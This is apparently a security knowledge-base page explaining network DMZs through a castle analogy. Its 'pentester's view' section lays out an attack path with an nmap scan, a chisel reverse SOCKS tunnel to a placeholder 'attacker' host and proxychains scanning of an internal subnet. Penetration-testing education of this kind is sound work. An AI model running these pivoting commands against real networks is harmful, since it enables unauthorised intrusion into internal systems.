# What is a Demilitarized Zone (DMZ)?
A Demilitarized Zone (DMZ) is a concept commonly used in the field of computer network security. It serves as a buffer zone between a private internal network and an external, untrusted network such as the internet. The primary purpose of a DMZ is to enhance the security of an organization's internal network by placing an additional layer of protection between the internal systems and potential external threats.

## Here's a simple analogy to help you understand

Imagine a medieval castle. The innermost part of the castle is where the king, nobles, and important resources are kept – this is your internal network. The area surrounding the castle, but not directly inside, is a space where traders, messengers, and other non-residents can interact with the castle without getting too close to the important parts. This surrounding area is the Demilitarized Zone.

Now, let's translate that analogy into network security terms:

- Internal Network (Innermost Castle): This is where an organization's critical data, servers, and sensitive information are stored. It's the heart of the organization's digital infrastructure.
- Demilitarized Zone (Surrounding Area): The DMZ is like a neutral ground that lies between the internal network and the external world, often represented by the internet. In the DMZ, you place servers and services that need to be accessed by external users, such as a website or email server.
- External Network (Outside World): This is the wild, untrusted territory – the internet. It's full of potential threats like hackers, malware, and other security risks.

By creating a DMZ, an organization can control and monitor traffic between the internal network and the external network. This ensures that only necessary and safe communication occurs between the internal and external environments. The DMZ acts as a protective barrier, preventing direct access to the sensitive internal network from the outside.

In the context of computer networks, common components found in a DMZ include firewalls, intrusion detection/prevention systems, and proxy servers. These components work together to filter and monitor traffic, allowing the organization to balance the need for accessibility with the imperative of security.

---

## The DMZ from a pentester's view

The DMZ is usually your **first foothold** — it holds the internet-facing servers you can reach directly. The goal is to compromise a DMZ host and then **pivot** through it into the protected internal network.

### Typical attack path

```
Internet --> [DMZ web/mail server]  <-- your initial target
                    |
              (pivot through it)
                    v
            [Internal network]  <-- the real prize
```

1. **Enumerate DMZ services** — web, mail, VPN, DNS are common here.

```bash
nmap -sV -p- dmz-host
```

2. **Exploit a DMZ host** (webshell, RCE, weak creds).
3. **Pivot inward** — the DMZ box often has a second interface into the internal LAN:

```bash
# Discover a second NIC / internal subnet from the compromised host
ip a; ip route
# Tunnel/pivot into the internal network
chisel client attacker:8000 R:socks     # reverse SOCKS proxy
proxychains nmap -sT 10.0.0.0/24         # scan internal net through the pivot
```

### Common findings

- **Over-permissive firewall rules** — DMZ host can reach far more of the internal network than it should.
- **Dual-homed hosts** — a DMZ server with a direct route to sensitive internal systems defeats the whole point.
- **Shared credentials** — a local admin password reused between DMZ and internal hosts.

A well-segmented DMZ means compromising it gives you *little* internal reach; test whether that segmentation actually holds.

## Related

- [Firewall](../Networking/Firewall.md) · [Jump Server](Jump%20Server.md)
- [Network Segmentation](../Networking/Subnetting.md)
